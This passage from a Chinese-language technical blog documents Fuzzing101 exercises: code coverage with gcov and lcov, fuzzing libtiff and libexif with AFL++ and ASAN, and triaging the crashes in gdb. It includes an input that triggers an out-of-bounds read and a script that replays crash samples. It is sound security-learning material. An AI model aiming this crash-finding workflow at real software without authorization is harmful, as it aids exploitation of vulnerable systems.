20)&#125;</span></span><br></pre></td></tr></table></figure><h2 id="c中的追踪"><a href="#c中的追踪" class="headerlink" title="c中的追踪"></a>c中的追踪</h2><p>对于c程序，我们有编译器自带的代码覆盖检测工具<strong>gcov</strong>。首先介绍一下如何使用gcov。</p><p>对于小的程序(好叭，就是不用makefile的程序而言)使用gcc编译时加上以下参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-fprofile-arcs -ftest-coverage</span><br></pre></td></tr></table></figure><p>就能够生成二进制程序，测试执行的代码覆盖面积。</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315205142963.png" alt="image-20220315205142963"></p><p>我们正常运行一个程序之后，使用如下代码测试代码覆盖率</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315205234184.png" alt="image-20220315205234184"></p><p>在同文件夹路径下生成的<strong>gcov文件</strong>，可以用来分析每行代码执行次数。这里截取了main函数部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">1</span>:   <span class="number">46</span>:<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="number">1</span>:   <span class="number">47</span>:    init_hex_values();</span><br><span class="line">    -:   <span class="number">48</span>:</span><br><span class="line">    <span class="number">1</span>:   <span class="number">49</span>:    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="number">1</span>:   <span class="number">50</span>:        <span class="type">char</span> *s = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="number">1</span>:   <span class="number">51</span>:        <span class="type">char</span> *t = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(s) + <span class="number">1</span>); <span class="comment">/* output is at most as long as input */</span></span><br><span class="line">    <span class="number">1</span>:   <span class="number">52</span>:        <span class="type">int</span> ret = cgi_decode(s, t);</span><br><span class="line">    <span class="number">1</span>:   <span class="number">53</span>:        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, t);</span><br><span class="line">    <span class="number">1</span>:   <span class="number">54</span>:        <span class="keyword">return</span> ret;</span><br><span class="line">    -:   <span class="number">55</span>:    &#125;</span><br><span class="line">    -:   <span class="number">56</span>:    <span class="keyword">else</span></span><br><span class="line">    -:   <span class="number">57</span>:    &#123;</span><br><span class="line">#####:   <span class="number">58</span>:        <span class="built_in">printf</span>(<span class="string">&quot;cgi_decode: usage: cgi_decode STRING\n&quot;</span>);</span><br><span class="line">#####:   <span class="number">59</span>:        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    -:   <span class="number">60</span>:    &#125;</span><br><span class="line">    -:   <span class="number">61</span>:&#125;</span><br></pre></td></tr></table></figure><p>注意，最左侧代表执行次数。如果是大于0的数字代表执行次数，”-“代表这一行不能执行，”#####”代表这一行没有被执行到。使用以下python脚本，可以实现对生成的gcov文件进行分析。下面代码的作用是读取gcov文件，将执行过的行号记录在一个set中，并输出。最后我们就能够得到本文件有哪些行被执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_gcov_coverage</span>(<span class="params">c_file</span>):</span><br><span class="line">    gcov_file = c_file + <span class="string">&quot;.gcov&quot;</span></span><br><span class="line">    coverage = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(gcov_file) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">            elems = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            covered = elems[<span class="number">0</span>].strip()</span><br><span class="line">            line_number = <span class="built_in">int</span>(elems[<span class="number">1</span>].strip())</span><br><span class="line">            <span class="keyword">if</span> covered.startswith(<span class="string">&#x27;-&#x27;</span>) <span class="keyword">or</span> covered.startswith(<span class="string">&#x27;#&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            coverage.add((c_file, line_number))</span><br><span class="line">    <span class="keyword">return</span> coverage</span><br></pre></td></tr></table></figure><p>使用以下命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">coverage = read_gcov_coverage(<span class="string">&#x27;cgi_decode.c&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>(coverage)[:<span class="number">5</span>]</span><br><span class="line"><span class="comment"># 输出如下</span></span><br><span class="line">[(<span class="string">&#x27;cgi_decode.c&#x27;</span>, <span class="number">53</span>),</span><br><span class="line"> (<span class="string">&#x27;cgi_decode.c&#x27;</span>, <span class="number">50</span>),</span><br><span class="line"> (<span class="string">&#x27;cgi_decode.c&#x27;</span>, <span class="number">62</span>),</span><br><span class="line"> (<span class="string">&#x27;cgi_decode.c&#x27;</span>, <span class="number">13</span>),</span><br><span class="line"> (<span class="string">&#x27;cgi_decode.c&#x27;</span>, <span class="number">16</span>)]</span><br></pre></td></tr></table></figure><h2 id="fuzz的优越性"><a href="#fuzz的优越性" class="headerlink" title="fuzz的优越性"></a>fuzz的优越性</h2><p>其实上面的代码是有Bug的，作者留了一手没有说，就是为了fuzzer这里提到。就是当碰到百分号时，我们会往后取两个数字，因为要转义成相应的ascii字符。这里就可能出现越界读。例如考虑以下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">82 202*&amp;&lt;1&amp;($34\&#x27;&quot;/\&#x27;.&lt;5/!8&quot;\&#x27;5:!4))%;</span><br></pre></td></tr></table></figure><p>这里就会尝试读取末尾百分号后面的分号，以及分号之后的(没有了！)这可能导致信息泄露，或者segmentation fault。如果程序位于c语言中，问题将会更加明显，(问题在下两行中)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> digit_high = *++s;</span><br><span class="line"><span class="type">int</span> digit_low = *++s;</span><br></pre></td></tr></table></figure><p>我们之前讨论了许多代码如何覆盖，也没有看出来这个问题。</p><h2 id="基础知识的总结"><a href="#基础知识的总结" class="headerlink" title="基础知识的总结"></a>基础知识的总结</h2><p>了解coverage更重要的其实是<strong>对于fuzz提供一个衡量标准</strong>。</p><p>主要学到了</p><ol><li>coverage类以及相关使用方法(输出执行过的代码或者函数、输出代码执行次数、输出执行流程)</li><li>c语言中编译器自带代码执行覆盖分析工具gcov。已经集成在gcc中。我们需要先运行程序，(将在相同路径下生成.gcda和.gcno)，之后使用gcov对.c文件进行分析。</li></ol><h1 id="fuzz101环境"><a href="#fuzz101环境" class="headerlink" title="fuzz101环境"></a>fuzz101环境</h1><p>麻了，之前的source forge和github都不管用了，答案用的是osgeo，真的不知道是怎么找的。环境的链接不搬运了，都在网站的solution里面。</p><p>这次学习的重点是使用lcov以及asan工具。其中asan用来便于找到内存污点，lcov用于输出fuzzing的覆盖面。这次练习就是学会把这三个工具组合起来使用。</p><p>第一步还是编译，使用AFL++和ASAN编译。<code>AFL_USE_ASAN=1</code>就相当于指定了使用ASAN。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make -j4</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure><p>依然是使用如下代码开始fuzzing</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/fuzzing_tiff/tiff-4.0.4/test/images/ -o $HOME/fuzzing_tiff/out/ -s 123 -- $HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure><p>找到了巨多的错</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315220044853.png" alt="image-20220315220044853"></p><h2 id="fuzzing结果"><a href="#fuzzing结果" class="headerlink" title="fuzzing结果"></a>fuzzing结果</h2><p>随便尝试了运行一个，ASAN很清楚地给出了我们错误所在(这个工具tql)</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315220359040.png" alt="image-20220315220359040"></p><p>以下是ASAN输出的影子堆栈。不过这个输出是有特定含义的。</p><ol><li>8 字节的数据可读写，则 shadow memory 的值为 0</li><li>8 字节的数据不可读写，则 shadow memory 的值为<strong>负数</strong>，如 <code>0xfa</code> 表示堆左边的 redzone、<code>0xf1</code> 表示栈左边的 redzone. ASan 也根据这个值在报错的时候输出对应的错误类型，如区分 <code>heap-buffer-underflow</code>/<code>stack-buffer-underflow</code></li><li>前 k 个字节可读写，后 8 - k 个字节不可读写，则 shadow memory 的值为 k，k 的取值范围为 <code>[1, 7]</code> </li></ol><p>借用下面这张图，可以看得更清楚，先举一个例子，参考的是<a href="https://zhuanlan.zhihu.com/p/382994002">这篇文章</a>，写的非常好</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315221631518.png" alt="image-20220315221631518"></p><p>f1表示stack-left，f3表示stack right。同时，中间的28bytes末尾也被标记为04，表示只有四字节可以写。(05表示5字节可写，以此类推)</p><p>结合我们的输出</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315221443674.png" alt="image-20220315221443674"></p><p>可以发现越界出现在这里[01]位置，也就是我们只能写这里的一个byte。而这个地方位于fa和fa之间，应该是申请的堆空间，产生了越界写。</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>太麻烦了，使用了ASAN之后似乎crash都没有用了。直接gdb调试起来会退出，不知道哪位师傅知道为什么?</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220316090428606.png" alt="image-20220316090428606"></p><h2 id="使用lcov进行覆盖率分析"><a href="#使用lcov进行覆盖率分析" class="headerlink" title="使用lcov进行覆盖率分析"></a>使用lcov进行覆盖率分析</h2><p>之前介绍了c语言中的gcov工具，这里用的是lcov，两者有什么区别呢?<strong>lcov是gcov的前端工具</strong></p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220316081502169.png" alt="image-20220316081502169"></p><p>一般而言，使用lcov的方法在上面也写了。就是编译程序的时候(gcc *)加上<code>-fpro-file-arcs</code>和<code>-ftest-coverage</code>。然而我们要生成configure文件，不是直接调用的gcc，而是使用makefile。那么就只能在configure的时候加上”-coverage”</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS=<span class="string">&quot;--coverage&quot;</span> LDFLAGS=<span class="string">&quot;--coverage&quot;</span> ./configure --prefix=<span class="string">&quot;$HOME/fuzzing_tiff/install/&quot;</span> --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.jianshu.com/p/a42bbd9de1b7">链接</a>学习了lcov的用法。简要记录在下面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将文件夹内所有.da文件删除</span></span><br><span class="line">lcov --zerocounters --directory ./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首先是初始化捕获文件夹</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-c 捕获，-i初始化，-d应用目录，-o输出文件</span></span><br><span class="line">lcov -c -i -d ./ -o init.info</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二步是运行生成的可执行文件</span></span><br><span class="line">./test_cover</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第三步是收集运行文件生成的信息(必须由gcov编译)</span></span><br><span class="line">lcov -c -d ./ -o cover.info</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第四步合并基准数据和我们测试之后获得的覆盖面数据</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-a 合并文件</span></span><br><span class="line">lcov -a init.info -a cover.info -o total.info</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第五步可以结合genhtml生成html文件</span></span><br><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./total.info</span><br></pre></td></tr></table></figure><p>我选择了前十个崩溃的样本，得到如下结果。</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220315234920652.png" alt="image-20220315234920652"></p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220316084227843.png" alt="image-20220316084227843"></p><p>甚至连源码的哪一行可以被执行到都列出来了，这个工具tql</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220316084306191.png" alt="image-20220316084306191"></p><p>使用的命令是就是以上的命令。在fuzzing101中的最后一步使用了一个<code>--no-checksum</code>，查看文档。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--checksum</span><br><span class="line">--no-checksum</span><br><span class="line">Specify whether to generate checksum data when writing tracefiles.</span><br><span class="line"></span><br><span class="line">Use --checksum to enable checksum generation or --no-checksum to disable it. Checksum generation is disabled by default.</span><br><span class="line"></span><br><span class="line">When checksum generation is enabled, a checksum will be generated for each source code line and stored along with the coverage data. This checksum will be used to</span><br><span class="line">prevent attempts to combine coverage data from different source code versions.</span><br><span class="line"></span><br><span class="line">If you don&#x27;t work with different source code versions, disable this option to speed up coverage data processing and to reduce the size of tracefiles.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后我写了一个脚本，把所有poc全部执行一遍（这里用的是相对路径，本batch文件放在tiff-4.0.4文件夹中）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ../out/default/crashes/                                                  </span><br><span class="line">file_all=$(ls)</span><br><span class="line">cd ../../../tiff-4.0.4/</span><br><span class="line">for file in $file_all</span><br><span class="line">do</span><br><span class="line">    $HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/            fuzzing_tiff/out/default/crashes/$file</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>可以看到运行poc代码中的覆盖面确实相对而言多了一点(相比于之前的)</p><p><img src="/2022/03/15/fuzzing-4-code_coverage/image-20220316085713705.png" alt="image-20220316085713705"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学到了代码覆盖面的衡量标准，通过python的systrace能够编写简单的trace程序。使用gcc原生gcov和locv创建可视化代码覆盖面图表。使用afl结合ASAN输出代码漏洞(这里弥补了练习3中我至今没有跑出来的漏洞，发现ASAN工具能够直接给出问题，但是似乎不能调试)总的来说，是关于代码覆盖面如何测量、计算的一个比较全面的学习。</p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> fuzzing101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzing-2</title>
      <link href="/2022/03/13/fuzzing-2/"/>
      <url>/2022/03/13/fuzzing-2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%202">学习网站</a>,，这次主要基于libexif，fizz共享库。<br>封校了，安心学习ing</p><span id="more"></span><p>本次尝试使用afl++对一个library进行fuzz。fuzz本身倒是不难，我觉得难的是配置这样那样的环境，找到合适的训练样本。</p><p>按照练习的说法，我们的workflow是</p><ol><li>Find an interface application that makes use of the libexif library</li><li>Create a seed corpus of exif samples</li><li>Compile libexif and the chosen application to be fuzzed using afl-clang-lto</li><li>Fuzz libexif until you have a few unique crashes</li><li>Triage the crashes to find a PoC for each vulnerability</li><li>Fix the issues</li></ol><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>找到libexif倒不是很困难，难的是编译的时候总是报错。直接在github上面搜索<code>libexif</code>即可。<a href="https://github.com/libexif/libexif">链接</a>。但是注意要下特定版本的(0.6.14)。<strong>这里遇到了第一个问题，怎么下载历史版本library</strong>。看了答案，完全不理解怎么找到的这个网站。甚至直接浏览器搜索<a href="https://github.com/libexif/libexif/archive/%E9%83%BD%E6%98%AF404%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8D%B4%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/libexif/libexif/archive/都是404，但是却可以下载。</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz</span><br></pre></td></tr></table></figure><p>接下来解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf libexif-0_6_14-release.tar.gz</span><br></pre></td></tr></table></figure><p>接下来是编译。这里找到了一个很好的<a href="http://blog.fpliu.com/it/software/development/language/c/library/libexif">介绍编译选项的网站</a>，然后发现其实在这里也有<a href="http://blog.fpliu.com/it/software/development/language/c/library/libexif/build-for-current-host">下载链接</a>，不用去github那个诡异的链接里面下载了。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314102227098.png" alt="image-20220314102227098"></p><p>通过这个网站的学习，了解到configure的用法——生成makefile文件。具体的我不搬运了，讲的挺好的。重点写一下自己学到的。</p><blockquote><p>一般git clone下载的文件，由于不知道要在那些系统上(windows,linux等)，用什么编译器(gcc,clang)编译，因此需要<strong>生成</strong>一个符合系统配置的makefile文件。这时就需要用configure生成了。除此以外，手工编写makefile文件也是很大的挑战。具体来说，有以下几步</p><p>利用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autoreconf -fvi</span><br></pre></td></tr></table></figure><p>来生成一个全新的configure文件。<a href="https://docs.oracle.com/cd/E56344_01/html/E54075/autoreconf-1.html">参考</a></p><p>之后设置configure的参数。我们重点设置安装路径和使用的编译器种类。(编译器可能不设置默认为gcc？)这里是看了答案的。类似于上一次lab，指定安装路径为/install文件夹即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br></pre></td></tr></table></figure><p>之后就可以make了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure></blockquote><p>期间遇到了一些问题，记录在下文了。</p><p>之后嘞，需要找一个使用libexif的文件，最好不是GUI的。我们在<a href="https://github.com/libexif/libexif">libexif的官网</a>上其实能找到。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314111515233.png" alt="image-20220314111515233"></p><p>看到答案是下了exif，我这里也下这个吧。之后编译exif的过程和上面差不多，网上也能查到，看答案也没问题。需要注意的是这里的configure文件编写。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br></pre></td></tr></table></figure><p>这里的<code>PKG_CONFIG_PATH</code>是什么意思呢?网上查</p><blockquote><p><code>PKG_CONFIG_PATH</code>是一个环境变量，它指定<code>pkg-config</code>将在其中搜索其.pc文件的其他路径。</p><p>此变量用于增强pkg-config的默认搜索路径。在典型的Unix系统上，它将搜索目录<code>/usr/lib/pkgconfig</code>和<code>/usr/share/pkgconfig</code>。这通常包括系统安装的模块。但是，某些本地模块可能安装在不同的前缀中，例如<code>/usr/local</code>。在这种情况下，必须预先设置搜索路径，以便pkg-config可以找到.pc文件。</p></blockquote><p>我的理解是，既然我们把libexif它安装在了我们指定路径下(编译libexif时的configure)，这里就需要指定pkgconfig，因为它并不是安装在上面写的默认搜索路径中。在这两步之后，就能够正常运行libexif了。</p><h2 id="环境配置遇到的问题"><a href="#环境配置遇到的问题" class="headerlink" title="环境配置遇到的问题"></a>环境配置遇到的问题</h2><p>尝试<code>./configure</code>时：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* Fatal: libexif command line interface requires libexif to build.</span><br><span class="line">*</span><br><span class="line">* Possible solutions:</span><br><span class="line">*   - set PKG_CONFIG_PATH to adequate value</span><br><span class="line">*   - call configure with LIBEXIF_LIBS=.. and LIBEXIF_CFLAGS=..</span><br><span class="line">*   - call configure with one of the --with-libexif parameters</span><br><span class="line">*   - get libexif and install it:</span><br></pre></td></tr></table></figure><p>解决：这个是exif而不是libexif。需要先安装libexif。</p><p>尝试<code>make install</code>时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make[2]: *** No rule to make target &#x27;install-apidocs&#x27;, needed by &#x27;install-data-local&#x27;.  Stop.</span><br></pre></td></tr></table></figure><p>解决：这个似乎完全不需要管，程序照样能运行。(输入/home/fuzz/fuzzing_libexif/install/bin/exif)可以看到输出。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314112758534.png" alt="image-20220314112758534"></p><h1 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h1><p>在fuzz之前，按照练习的说法，需要用<code>afl-clang-lto</code>重新编译上述两个文件。只需要指定CC与CXX两个环境变量即可。（这里为什么是llvm-config-11不太清楚，不过看说明这应该是一个专门写在config上面的配置文件）</p><p><img src="/2022/03/13/fuzzing-2/image-20220314130801214.png" alt="image-20220314130801214"></p><p>以下是代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/fuzzing_libexif/libexif-libexif-0_6_14-release/</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后可以用afl-clang-lto编译上述文件。查看文档，afl-lto实际上是首选项。这样会导致之前讲到的hashmap冲突发生的可能性更小。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------+</span><br><span class="line">| clang/clang++ 11+ is available | --&gt; use LTO mode (afl-clang-lto/afl-clang-lto++)</span><br><span class="line">+--------------------------------+     see [instrumentation/README.lto.md](instrumentation/README.lto.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LTO afl-clang-lto/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">+---------------------------------+</span><br><span class="line">| clang/clang++ 3.8+ is available | --&gt; use LLVM mode (afl-clang-fast/afl-clang-fast++)</span><br><span class="line">+---------------------------------+     see [instrumentation/README.llvm.md](instrumentation/README.llvm.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LLVM afl-clang-fast/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line"> +--------------------------------+</span><br><span class="line"> | gcc 5+ is available            | -&gt; use GCC_PLUGIN mode (afl-gcc-fast/afl-g++-fast)</span><br><span class="line"> +--------------------------------+    see [instrumentation/README.gcc_plugin.md](instrumentation/README.gcc_plugin.md) and</span><br><span class="line">                                       [instrumentation/README.instrument_list.md](instrumentation/README.instrument_list.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if you do not have a gcc with plugin support</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">   use GCC mode (afl-gcc/afl-g++) (or afl-clang/afl-clang++ for clang)</span><br></pre></td></tr></table></figure><p>使用以下语句完成编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i /home/fuzz/fuzzing_libexif/exif-samples-master/jpg -o /home/fuzz/fuzzing_libexif/out -s 123 -- $HOME/fuzzing_libexif/install/bin/exif @@</span><br></pre></td></tr></table></figure><p>解释一下上面语句的含义。-i指定了输入文件，-o指定输出文件夹(这两个都是fuzzer所需要的)，-s是seed，一个随机种子。后面的<code>--</code>代表命令行的输入，也就是我们如何从命令行调用这个文件，@@表示afl将在这里替换我们的输入，也就是上面-i的内容。跑了一会儿之后得到下面的内容。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314105819541.png" alt="image-20220314105819541"></p><p>发现还是出现了蛮多错误的，都是sigmentation fault。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314131953777.png" alt="image-20220314131953777"></p><p><img src="/2022/03/13/fuzzing-2/image-20220314132049731.png" alt="image-20220314132049731"></p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>之前是用gdb调试，这次练习教的是用eclipse。但是我不想用，linux中图形化支持有点慢。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x000000000022baef in exif_data_load_data (data=0x4535b0, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;) at exif-utils.c:92</span><br><span class="line">92                      return ((buf[0] &lt;&lt; 8) | buf[1]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/fuzzing-2/image-20220314132420032.png" alt="image-20220314132420032"></p><p>还是用的gdb。可以看到停在了这里</p><p><img src="/2022/03/13/fuzzing-2/image-20220314132857871.png" alt="image-20220314132857871"></p><p>这里$rcx并不是一个合理的值，可能是溢出之后的结果。就是这里导致了segmentation fault。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314132952712.png" alt="image-20220314132952712"></p><h2 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h2><p>使用以下命令递归查找文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 